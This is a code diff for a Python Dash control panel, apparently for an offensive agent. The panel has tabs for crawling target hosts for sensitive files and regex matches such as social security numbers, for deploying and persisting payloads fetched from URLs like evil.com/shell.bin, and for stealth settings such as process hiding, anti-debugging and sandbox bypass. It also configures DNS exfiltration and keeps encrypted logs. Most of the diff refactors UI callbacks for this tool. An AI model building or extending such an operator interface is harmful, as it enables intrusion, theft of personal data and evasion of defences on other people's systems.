         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
             html.H2(":: AGENT DEPLOYMENT & CONFIGURATION ::", style=CYBER_SECTION_HEADER_STYLE),
@@ -931,7 +929,6 @@ def render_tab_content(tab,
             create_input_section("REGEX PATTERNS IN CONTENT (Ex: (\\d{3}-\\d{2}-\\d{4})):", 'regex-patterns', regex_patterns, placeholder='Comma-separated regex patterns'),
 
             html.H2(":: AGENT OPERATIONAL SETTINGS ::", style=CYBER_SECTION_HEADER_STYLE),
-            # Les inputs visibles utilisent les valeurs des hidden inputs
             create_input_section("PAYLOAD URL (Optional for Dropper):", 'payload-url-control-tab-visible', payload_url, placeholder='Ex: http://evil.com/shell.bin'),
             create_input_section("PAYLOAD PATH (Optional on Target):", 'payload-path-control-tab-visible', payload_path, placeholder='Ex: /data/local/tmp/payload_binary'),
             create_input_section("PROCESSING THREADS (for scan & upload):", 'threads', threads, type='number', min=1),
@@ -948,15 +945,14 @@ def render_tab_content(tab,
             ], style={'marginTop': '40px', 'display': 'flex', 'justifyContent': 'center', 'gap': '25px'}),
 
 
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+        ]), payload_url, payload_path
     elif tab == 'tab-file-explorer':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
-            # interval-explorer-logs est maintenant dans hidden-elements
             html.H2(":: TARGET FILE EXPLORER ::", style=CYBER_SECTION_HEADER_STYLE),
 
             create_input_section("TARGET HOST (URL or IP) *:", 'explorer-target-host-display', explorer_target_host, required=True),
             create_input_section("BASE PATH FOR EXPLORATION (Optional, e.g., /var/www/html/wp-content/uploads/):", 'explorer-base-path-display', explorer_base_path, placeholder="Leave empty for full site crawl"),
-            create_input_section("MAX EXPLORATION DEPTH (0 for base only, 1 for direct subfolders, etc.) :", 'explorer-max-depth-display', explorer_max_depth, type='number', min=0, required=True), # Use explorer_max_depth here
+            create_input_section("MAX EXPLORATION DEPTH (0 for base only, 1 for direct subfolders, etc.) :", 'explorer-max-depth-display', explorer_max_depth, type='number', min=0, required=True),
 
             html.Div([
                 html.Button('LAUNCH EXPLORATION', id='launch-explorer-button', n_clicks=0, style={**CYBER_BUTTON_PRIMARY, 'boxShadow': '0 0 18px rgba(0,191,255,0.7)', 'backgroundImage': 'linear-gradient(145deg, #00BFFF, #0077AA)', 'marginTop': '0px'}),
@@ -971,6 +967,8 @@ def render_tab_content(tab,
                     {"name": "PATH", "id": "path", "presentation": "markdown"},
                     {"name": "TYPE", "id": "type"},
                     {"name": "MATCHING REGEX", "id": "sensitive_match"},
+                    {"name": "CONTENT TYPE", "id": "content_type"}, # Nouvelle colonne pour le type de contenu
+                    {"name": "SOURCE", "id": "source"}, # Nouvelle colonne pour la source de la détection
                     {"name": "ACTIONS", "id": "actions", "presentation": "markdown"}
                 ],
                 data=[],
@@ -991,6 +989,36 @@ def render_tab_content(tab,
                         'backgroundColor': '#1A1A1A',
                         'color': '#FF00FF',
                         'fontWeight': 'bold'
+                    },
+                    { # Style pour les types de contenu sensible
+                        'if': {'filter_query': '{type} = "content_match"'},
+                        'backgroundColor': '#2A1A1A',
+                        'color': '#FFAA00',
+                        'fontWeight': 'bold'
+                    },
+                     { # Style pour API
+                        'if': {'filter_query': '{type} = "api_endpoint"'},
+                        'backgroundColor': '#1A2A2A',
+                        'color': '#00EEFF',
+                        'fontWeight': 'bold'
+                    },
+                    { # Style pour Vuln
+                        'if': {'filter_query': '{type} = "vulnerable_path"'},
+                        'backgroundColor': '#3A1A1A',
+                        'color': '#FF0000',
+                        'fontWeight': 'bold'
+                    },
+                    { # Style pour Sitemap
+                        'if': {'filter_query': '{type} = "sitemap_entry"'},
+                        'backgroundColor': '#1A1A2A',
+                        'color': '#CCAAFF',
+                        'fontWeight': 'bold'
+                    },
+                    { # Style pour Form
+                        'if': {'filter_query': '{type} = "form_data"'},
+                        'backgroundColor': '#1A2A1A',
+                        'color': '#00FF00',
+                        'fontWeight': 'bold'
                     }
                 ],
                 page_action='none',
@@ -1002,10 +1030,10 @@ def render_tab_content(tab,
             dcc.Download(id="download-file-data"),
 
             html.H2(":: EXPLORER LIVE LOGS ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
-            # Affiche le contenu du buffer caché ici
-            html.Pre(explorer_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '150px'}, id='explorer-logs-output_visible'),
+            # children=None pour laisser refresh_all_live_logs le remplir
+            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '150px'}, id='explorer-logs-output_visible'),
 
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+        ]), payload_url, payload_path
     elif tab == 'tab-system-profiler':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
             html.H2(":: TARGET SYSTEM PROFILE ::", style=CYBER_SECTION_HEADER_STYLE),
@@ -1096,14 +1124,13 @@ def render_tab_content(tab,
                     ),
                 ]),
             ])
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+        ]), payload_url, payload_path
     elif tab == 'tab-payloads':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
             html.H2(":: PAYLOAD DEPLOYMENT & PERSISTENCE ::", style=CYBER_SECTION_HEADER_STYLE),
             html.Div([
                 html.P("Manage the deployment, execution, and persistence of custom payloads on the target system.", style={'color': '#00FFFF', 'marginBottom': '20px'}),
                 html.Div([
-                    # FIX: Renommer les IDs ici pour qu'ils soient locaux à l'onglet et passent la valeur de l'input caché
                     create_input_section("PAYLOAD SOURCE (URL):", 'payload-source-url-visible', payload_url, placeholder='e.g., http://your.server/malware.exe'),
                     create_input_section("TARGET PATH ON AGENT:", 'payload-target-path-visible', payload_path, placeholder='e.g., /tmp/update.bin or C:\\Windows\\Temp\\temp.exe'),
                 ]),
@@ -1114,7 +1141,7 @@ def render_tab_content(tab,
                 ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
                 html.Div(id='payload-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Payload management status and logs will appear here."),
             ]),
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+        ]), payload_url, payload_path
     elif tab == 'tab-stealth':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
             html.H2(":: STEALTH & ANTI-EVASION CONTROLS ::", style=CYBER_SECTION_HEADER_STYLE),
@@ -1128,13 +1155,12 @@ def render_tab_content(tab,
                 html.Button('APPLY STEALTH SETTINGS', id='apply-stealth-button', n_clicks=0, style=CYBER_BUTTON_SECONDARY),
                 html.Div(id='stealth-status-output', style={**CYBER_STATUS_BOX_STYLE, 'marginTop': '30px'}, children="Stealth control status and evasion attempts will be logged here."),
             ]),
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+        ]), payload_url, payload_path
     elif tab == 'tab-logs-status':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
             html.H2(":: AGENT LIVE LOG STREAM ::", style=CYBER_SECTION_HEADER_STYLE),
-            # FIX: Cet ID était 'command-output', il est maintenant 'live-log-stream-display'
-            # Il affiche le contenu du buffer caché '_hidden_dashboard_live_logs_buffer'
-            html.Pre(dashboard_live_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF'}, id='live-log-stream-display'),
+            # children=None pour laisser refresh_all_live_logs le remplir
+            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'color': '#00FFFF'}, id='live-log-stream-display'),
 
             html.H2(":: ENCRYPTED LOG ARCHIVE ::", style={**CYBER_SECTION_HEADER_STYLE, 'marginTop': '40px'}),
             html.Div([
@@ -1143,40 +1169,25 @@ def render_tab_content(tab,
             ], style={'marginTop': '20px', 'display': 'flex', 'justifyContent': 'center', 'gap': '20px'}),
             dcc.Download(id="download-logs-data"),
             html.Pre(id='decrypted-logs-output', style={**CYBER_STATUS_BOX_STYLE, 'color': '#7FFF00', 'marginTop': '30px'}, children="DECRYPTED LOGS (IF AVAILABLE)..."),
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
-    # NOUVELLE CONDITION POUR L'ONGLET DYNAMIC DISPLAY
+        ]), payload_url, payload_path
     elif tab == 'tab-dynamic-display':
-        # Charger le contenu de index.html et l'envelopper dans un Div
-        # On ne peut pas directement rendre un fichier HTML complet avec <head> et <body>
-        # Dash s'occupe déjà de la structure HTML de base.
-        # Nous allons extraire le contenu de <body> pour l'afficher.
         display_html_content = get_display_html_content()
-        # Regex pour extraire le contenu entre <body> et </body>
         body_content_match = re.search(r'<body>(.*?)</body>', display_html_content, re.DOTALL)
         if body_content_match:
-            # Utilisez html.Iframe pour intégrer le contenu, ce qui permet à script.js et style.css de fonctionner
-            # en référençant les fichiers comme s'ils étaient dans le dossier 'assets'.
-            # L'attribut 'src' doit pointer vers le fichier statique lui-même, qui sera servi par Dash.
             return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
                 html.H2(":: DYNAMIC INFORMATION DISPLAY ::", style=CYBER_SECTION_HEADER_STYLE),
-                # Pour s'assurer que les CSS et JS sont chargés, le mieux est d'utiliser un Iframe
-                # ou de ne pas avoir de fichiers head/body/html dans index.html.
-                # Puisque les fichiers sont dans assets_folder, ils seront disponibles à /assets/style.css, etc.
-                # La solution la plus propre est d'utiliser un Iframe.
                 html.Iframe(
-                    src="/assets/index.html", # Ceci pointe vers le fichier index.html dans le dossier assets
+                    src="/assets/index.html",
                     style={
                         "width": "100%",
                         "height": "600px",
                         "border": "none",
-                        "backgroundColor": "#0A0A0A", # Assure un fond sombre si l'iframe ne charge pas ses propres styles tout de suite
+                        "backgroundColor": "#0A0A0A",
                         "borderRadius": "8px",
                         "boxShadow": "inset 0 0 10px rgba(0,255,65,0.05)",
                     }
                 )
-            ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
-    # Ce cas de 'dash.no_update' ne doit se produire que si aucun onglet valide n'est sélectionné.
-    # Et les Outputs supplémentaires doivent aussi être gérés.
+            ]), payload_url, payload_path
     return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[html.H2("LOADING...", style=CYBER_SECTION_HEADER_STYLE)]), dash.no_update, dash.no_update
 
 # --- Callbacks ---
@@ -1187,129 +1198,216 @@ def toggle_dns_options(method):
 
 
 # --- CALLBACKS DE SYNCHRONISATION : Input Visible --> Hidden Input ---
-# Ces callbacks transfèrent les valeurs des inputs visibles vers des inputs cachés
-# pour assurer la persistance de l'état entre les onglets et la gestion des callbacks.
+# Ces callbacks sont nécessaires pour synchroniser les valeurs des inputs visibles
+# (qui sont dans des onglets non persistants) vers des inputs cachés (qui sont toujours dans le DOM).
+# Cela permet aux callbacks de lecture (comme apply_and_save_single_setting si on utilisait les hidden inputs)
+# d'accéder à la dernière valeur mise à jour, même si l'onglet est changé.
 
 @app.callback(Output('target-url-hidden', 'value', allow_duplicate=True), Input('target-url', 'value'), prevent_initial_call=True)
-def _update_hidden_target_url(value): return value
+def _update_hidden_target_url(value): return value if value is not None else ''
 
 @app.callback(Output('scan-path-hidden', 'value', allow_duplicate=True), Input('scan-path', 'value'), prevent_initial_call=True)
-def _update_hidden_scan_path(value): return value
+def _update_hidden_scan_path(value): return value if value is not None else ''
 
 @app.callback(Output('aes-key-hidden', 'value', allow_duplicate=True), Input('aes-key', 'value'), prevent_initial_call=True)
-def _update_hidden_aes_key(value): return value
+def _update_hidden_aes_key(value): return value if value is not None else ''
 
 @app.callback(Output('exfil-method-hidden', 'value', allow_duplicate=True), Input('exfil-method', 'value'), prevent_initial_call=True)
-def _update_hidden_exfil_method(value): return value
+def _update_hidden_exfil_method(value): return value if value is not None else ''
 
 @app.callback(Output('dns-server-hidden', 'value', allow_duplicate=True), Input('dns-server', 'value'), prevent_initial_call=True)
-def _update_hidden_dns_server(value): return value
+def _update_hidden_dns_server(value): return value if value is not None else ''
 
 @app.callback(Output('dns-domain-hidden', 'value', allow_duplicate=True), Input('dns-domain', 'value'), prevent_initial_call=True)
-def _update_hidden_dns_domain(value): return value
+def _update_hidden_dns_domain(value): return value if value is not None else ''
 
 @app.callback(Output('file-types-hidden', 'value', allow_duplicate=True), Input('file-types', 'value'), prevent_initial_call=True)
-def _update_hidden_file_types(value): return value
+def _update_hidden_file_types(value): return value if value is not None else ''
 
 @app.callback(Output('exclude-types-hidden', 'value', allow_duplicate=True), Input('exclude-types', 'value'), prevent_initial_call=True)
-def _update_hidden_exclude_types(value): return value
+def _update_hidden_exclude_types(value): return value if value is not None else ''
 
 @app.callback(Output('min-size-hidden', 'value', allow_duplicate=True), Input('min-size', 'value'), prevent_initial_call=True)
-def _update_hidden_min_size(value): return value
+def _update_hidden_min_size(value): return value if value is not None else ''
 
 @app.callback(Output('max-size-hidden', 'value', allow_duplicate=True), Input('max-size', 'value'), prevent_initial_call=True)
-def _update_hidden_max_size(value): return value
+def _update_hidden_max_size(value): return value if value is not None else ''
 
 @app.callback(Output('keywords-hidden', 'value', allow_duplicate=True), Input('keywords', 'value'), prevent_initial_call=True)
-def _update_hidden_keywords(value): return value
+def _update_hidden_keywords(value): return value if value is not None else ''
 
 @app.callback(Output('regex-patterns-hidden', 'value', allow_duplicate=True), Input('regex-patterns', 'value'), prevent_initial_call=True)
-def _update_hidden_regex_patterns(value): return value
+def _update_hidden_regex_patterns(value): return value if value is not None else ''
+
+# NOUVEAUX CALLBACKS DE SYNCHRONISATION POUR LES CHAMPS DE L'EXPLORATEUR
+@app.callback(Output('explorer-target-host-hidden', 'value', allow_duplicate=True), Input('explorer-target-host-display', 'value'), prevent_initial_call=True)
+def _update_hidden_explorer_target_host(value): return value if value is not None else ''
+
+@app.callback(Output('explorer-base-path-hidden', 'value', allow_duplicate=True), Input('explorer-base-path-display', 'value'), prevent_initial_call=True)
+def _update_hidden_explorer_base_path(value): return value if value is not None else ''
+
+@app.callback(Output('explorer-max-depth-hidden', 'value', allow_duplicate=True), Input('explorer-max-depth-display', 'value'), prevent_initial_call=True)
+def _update_hidden_explorer_max_depth(value): return value if value is not None else ''
+
+# NOUVEAUX CALLBACKS DE SYNCHRONISATION POUR PAYLOAD ET STEALTH (si non déjà faits)
+@app.callback(Output('payload-url-hidden', 'value', allow_duplicate=True), Input('payload-source-url-visible', 'value'), prevent_initial_call=True)
+def _update_hidden_payload_url(value): return value if value is not None else ''
+
+@app.callback(Output('payload-path-hidden', 'value', allow_duplicate=True), Input('payload-target-path-visible', 'value'), prevent_initial_call=True)
+def _update_hidden_payload_path(value): return value if value is not None else ''
+
+@app.callback(Output('threads-hidden', 'value', allow_duplicate=True), Input('threads', 'value'), prevent_initial_call=True)
+def _update_hidden_threads(value): return value if value is not None else ''
+
+# Correction ici: la valeur de 'debug-mode' (et autres checklists) est une LISTE.
+# On doit la convertir en chaîne pour l'input caché.
+@app.callback(Output('debug-mode-hidden', 'value', allow_duplicate=True), Input('debug-mode', 'value'), prevent_initial_call=True)
+def _update_hidden_debug_mode(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
+
+@app.callback(Output('no-clean-hidden', 'value', allow_duplicate=True), Input('no-clean', 'value'), prevent_initial_call=True)
+def _update_hidden_no_clean(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
+
+@app.callback(Output('no-anti-evasion-hidden', 'value', allow_duplicate=True), Input('no-anti-evasion', 'value'), prevent_initial_call=True)
+def _update_hidden_no_anti_evasion(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
+
+@app.callback(Output('stealth-hide-process-hidden', 'value', allow_duplicate=True), Input('stealth-hide-process', 'value'), prevent_initial_call=True)
+def _update_hidden_stealth_hide_process(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
+
+@app.callback(Output('stealth-anti-debug-hidden', 'value', allow_duplicate=True), Input('stealth-anti-debug', 'value'), prevent_initial_call=True)
+def _update_hidden_stealth_anti_debug(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
+
+@app.callback(Output('stealth-sandbox-bypass-hidden', 'value', allow_duplicate=True), Input('stealth-sandbox-bypass', 'value'), prevent_initial_call=True)
+def _update_hidden_stealth_sandbox_bypass(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')
 
 
-# Les callbacks _sync_payload_url_to_hidden et _sync_payload_path_to_hidden ont été supprimés d'ici.
-# Leur logique a été déplacée dans render_tab_content.
-
-
-# --- Le callback apply_and_save_single_setting va maintenant gérer TOUS les boutons apply,
-# et lire les valeurs depuis les hidden inputs, qui sont eux-mêmes mis à jour par les callbacks _sync_..._to_hidden ---
-# NOTE: L'Input sur ALL n_clicks avec MATCH sur State est la façon correcte de gérer
-# les boutons générés dynamiquement. Cela garantit que l'ID du bouton cliqué est disponible
-# et que le callback ne se déclenche que si un bouton est effectivement cliqué.
 @app.callback(
-    Output({'type': 'apply-button', 'input_id': MATCH}, 'style'),
-    Input({'type': 'apply-button', 'input_id': ALL}, 'n_clicks'), # Changed MATCH to ALL
-    State({'type': 'apply-button', 'input_id': MATCH}, 'id'), # Keep MATCH for State to identify WHICH button was clicked
-    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
-    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
-    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
-    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
-    # Utiliser les versions cachées pour la sauvegarde de la config
-    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
-    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
+    # Output principal dynamique, toujours pour le dummy-output de l'input cliqué
+    Output({'type': 'dummy-output', 'input_id': MATCH}, 'children'),
+    Output({'type': 'apply-button', 'input_id': MATCH}, 'style'), # Style du bouton cliqué
+    Input({'type': 'apply-button', 'input_id': ALL}, 'n_clicks'), # Input: n_clicks de TOUS les boutons APPLY
+    State({'type': 'apply-button', 'input_id': MATCH}, 'id'), # State: l'ID du bouton qui a déclenché
+
+    # Les valeurs DOIVENT PROVENIR DES INPUTS CACHÉS car ils sont toujours dans le DOM
+    # Les noms d'arguments correspondent maintenant aux inputs cachés
+    State('target-url-hidden', 'value'),
+    State('scan-path-hidden', 'value'),
+    State('aes-key-hidden', 'value'),
+    State('exfil-method-hidden', 'value'),
+    State('dns-server-hidden', 'value'),
+    State('dns-domain-hidden', 'value'),
+    State('file-types-hidden', 'value'),
+    State('exclude-types-hidden', 'value'),
+    State('min-size-hidden', 'value'),
+    State('max-size-hidden', 'value'),
+    State('keywords-hidden', 'value'),
+    State('regex-patterns-hidden', 'value'),
+    State('payload-url-hidden', 'value'),
+    State('payload-path-hidden', 'value'),
+    State('threads-hidden', 'value'),
+    State('debug-mode-hidden', 'value'), # Valeur STRING du hidden input
+    State('no-clean-hidden', 'value'), # Valeur STRING du hidden input
+    State('no-anti-evasion-hidden', 'value'), # Valeur STRING du hidden input
+
     State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value'),
-    State('stealth-hide-process-hidden', 'value'),
-    State('stealth-anti-debug-hidden', 'value'),
-    State('stealth-sandbox-bypass-hidden', 'value'),
+
+    State('stealth-hide-process-hidden', 'value'), # Valeur STRING du hidden input
+    State('stealth-anti-debug-hidden', 'value'), # Valeur STRING du hidden input
+    State('stealth-sandbox-bypass-hidden', 'value'), # Valeur STRING du hidden input
+
     prevent_initial_call=True
 )
-def apply_and_save_single_setting(n_clicks_list, button_id, # n_clicks is now a list
-                                  target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
-                                  file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
-                                  payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
-                                  explorer_target_host, explorer_base_path, explorer_max_depth,
-                                  stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
+def apply_and_save_single_setting(n_clicks_list, button_id_match,
+                                  # Les arguments reçoivent maintenant les valeurs des inputs cachés (strings)
+                                  target_url_h, scan_path_h, aes_key_h, exfil_method_h, dns_server_h, dns_domain_h,
+                                  file_types_h, exclude_types_h, min_size_h, max_size_h, keywords_h, regex_patterns_h,
+                                  payload_url_h, payload_path_h, threads_h, debug_mode_val_str_h, no_clean_val_str_h, no_anti_evasion_val_str_h,
+                                  explorer_target_host_h, explorer_base_path_h, explorer_max_depth_h,
+                                  stealth_hide_process_val_str_h, stealth_anti_debug_val_str_h, stealth_sandbox_bypass_val_str_h):
     
     ctx = dash.callback_context
     if not ctx.triggered:
-        return dash.no_update
+        # Assurez-vous de retourner dash.no_update pour tous les Outputs
+        return dash.no_update, dash.no_update
 
-    # Trouver quel bouton a déclenché le callback en utilisant ctx.triggered_id
-    trigger_input_id_dict = ctx.triggered_id # C'est déjà le dictionnaire de l'ID dynamique
+    trigger_input_id_dict = ctx.triggered_id
     
-    # S'assurer que le déclencheur est bien un bouton APPLY et qu'il y a eu un clic valide
+    # S'assurer que c'est bien un bouton APPLY qui a déclenché
     if trigger_input_id_dict.get('type') != 'apply-button':
-        return dash.no_update
+        return dash.no_update, dash.no_update
 
-    # Optionnel: Récupérer le n_clicks spécifique pour le bouton cliqué si nécessaire pour d'autres logiques.
-    # Dans ce cas, comme le callback ne se déclenche qu'au clic, on sait qu'un clic valide s'est produit.
-    # Et on ne réinitialise pas le style pour les autres boutons.
+    # Convertir les valeurs STRING des hidden inputs en LISTES pour la logique
+    debug_mode_val = debug_mode_val_str_h.split(',') if debug_mode_val_str_h else []
+    no_clean_val = no_clean_val_str_h.split(',') if no_clean_val_str_h else []
+    no_anti_evasion_val = no_anti_evasion_val_str_h.split(',') if no_anti_evasion_val_str_h else []
+    stealth_hide_process_val = stealth_hide_process_val_str_h.split(',') if stealth_hide_process_val_str_h else []
+    stealth_anti_debug_val = stealth_anti_debug_val_str_h.split(',') if stealth_anti_debug_val_str_h else []
+    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str_h.split(',') if stealth_sandbox_bypass_val_str_h else []
 
-    # print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [DEBUG] Apply button clicked for: {trigger_input_id_dict['input_id']}") # Pour débogage
+    # Débogage : Afficher la valeur de l'input correspondant au bouton cliqué
+    input_id_of_triggered_button = trigger_input_id_dict['input_id']
+    
+    # Mappage des IDs UI (inputs visibles) aux arguments du callback
+    # Utilisation d'un dictionnaire pour rendre cela plus propre
+    # Les arguments du callback ont déjà les valeurs des hidden inputs
+    values_map = {
+        'target-url': target_url_h,
+        'scan-path': scan_path_h,
+        'aes-key': aes_key_h,
+        'exfil-method': exfil_method_h,
+        'dns-server': dns_server_h,
+        'dns-domain': dns_domain_h,
+        'file-types': file_types_h,
+        'exclude-types': exclude_types_h,
+        'min-size': min_size_h,
+        'max-size': max_size_h,
+        'keywords': keywords_h,
+        'regex-patterns': regex_patterns_h,
+        'payload-url-control-tab-visible': payload_url_h,
+        'payload-path-control-tab-visible': payload_path_h,
+        'threads': threads_h,
+        'debug-mode': debug_mode_val, # C'est déjà la liste ici
+        'no-clean': no_clean_val,
+        'no-anti-evasion': no_anti_evasion_val,
+        'explorer-target-host-display': explorer_target_host_h,
+        'explorer-base-path-display': explorer_base_path_h,
+        'explorer-max-depth-display': explorer_max_depth_h,
+        'stealth-hide-process': stealth_hide_process_val,
+        'stealth-anti-debug': stealth_anti_debug_val,
+        'stealth-sandbox-bypass': stealth_sandbox_bypass_val,
+    }
+    mapped_value = values_map.get(input_id_of_triggered_button, "N/A")
 
-    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
-    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
-    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
-    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
-    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
-    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str
+
+    print(f"\n[DEBUG_SAVE] Callback apply_and_save_single_setting déclenché par : {input_id_of_triggered_button}")
+    print(f"[DEBUG_SAVE] Valeur lue pour {input_id_of_triggered_button}: {mapped_value}")
+    print(f"[DEBUG_SAVE] Valeur de default_explorer_target_host (avant sauvegarde): {explorer_target_host_h}")
 
 
     config_to_save = {
-        "aes_key": aes_key, "default_target_url": target_url, "default_scan_path": scan_path,
-        "default_file_types": file_types, "default_exclude_types": exclude_types,
-        "default_min_size": min_size, "default_max_size": max_size,
-        "default_dns_server": dns_server, "default_dns_domain": dns_domain,
-        "default_keywords": keywords, "default_regex_patterns": regex_patterns,
-        "default_payload_url": payload_url, "default_payload_path": payload_path,
-        "default_threads": threads,
+        "aes_key": aes_key_h, "default_target_url": target_url_h, "default_scan_path": scan_path_h,
+        "default_file_types": file_types_h, "default_exclude_types": exclude_types_h,
+        "default_min_size": min_size_h, "default_max_size": max_size_h,
+        "default_dns_server": dns_server_h, "default_dns_domain": dns_domain_h,
+        "default_keywords": keywords_h, "default_regex_patterns": regex_patterns_h,
+        "default_payload_url": payload_url_h, "default_payload_path": payload_path_h,
+        "default_threads": threads_h,
         "default_debug_mode": debug_mode_val,
         "default_no_clean": no_clean_val,
         "default_no_anti_evasion": no_anti_evasion_val,
-        "default_explorer_target_host": explorer_target_host,
-        "default_explorer_base_path": explorer_base_path,
-        "default_explorer_depth": explorer_max_depth, # Use explorer_max_depth here
-        "default_exfil_method": exfil_method,
+        "default_explorer_target_host": explorer_target_host_h,
+        "default_explorer_base_path": explorer_base_path_h,
+        "default_explorer_depth": explorer_max_depth_h,
+        "default_exfil_method": exfil_method_h,
         "default_stealth_hide_process": stealth_hide_process_val,
         "default_stealth_anti_debug": stealth_anti_debug_val,
         "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
     }
     save_shared_config(config_to_save)
+    print(f"[DEBUG_SAVE] Appel de save_shared_config avec default_explorer_target_host: {config_to_save['default_explorer_target_host']}")
 
-    # Retourne le style activé pour le bouton cliqué (button_id est l'ID dynamique du bouton cliqué)
-    return CYBER_BUTTON_APPLY_ACTIVE
+    return f"Applied: {input_id_of_triggered_button} -> {mapped_value}", CYBER_BUTTON_APPLY_ACTIVE
 
 
 @app.callback(
@@ -1319,9 +1417,10 @@ def apply_and_save_single_setting(n_clicks_list, button_id, # n_clicks is now a 
     State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
     State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
     State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
-    # FIX: Utiliser les versions cachées pour la sauvegarde de la config
     State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
-    State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
+    State('debug-mode-hidden', 'value'),
+    State('no-clean-hidden', 'value'),
+    State('no-anti-evasion-hidden', 'value'),
     State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value'),
@@ -1331,37 +1430,37 @@ def apply_and_save_single_setting(n_clicks_list, button_id, # n_clicks is now a 
     prevent_initial_call=True
 )
 def save_config_final(n_clicks,
-                      target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
-                      file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
-                      payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
-                      explorer_target_host, explorer_base_path, explorer_max_depth,
-                      stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
+                      target_url_h, scan_path_h, aes_key_h, exfil_method_h, dns_server_h, dns_domain_h,
+                      file_types_h, exclude_types_h, min_size_h, max_size_h, keywords_h, regex_patterns_h,
+                      payload_url_h, payload_path_h, threads_h, debug_mode_val_str_h, no_clean_val_str_h, no_anti_evasion_val_str_h,
+                      explorer_target_host_h, explorer_base_path_h, explorer_max_depth_h,
+                      stealth_hide_process_val_str_h, stealth_anti_debug_val_str_h, stealth_sandbox_bypass_val_str_h):
     if n_clicks == 0:
         return "SAVE ALL CONFIG"
 
-    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
-    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
-    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
-    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
-    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
-    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str
+    debug_mode_val = debug_mode_val_str_h.split(',') if debug_mode_val_str_h else []
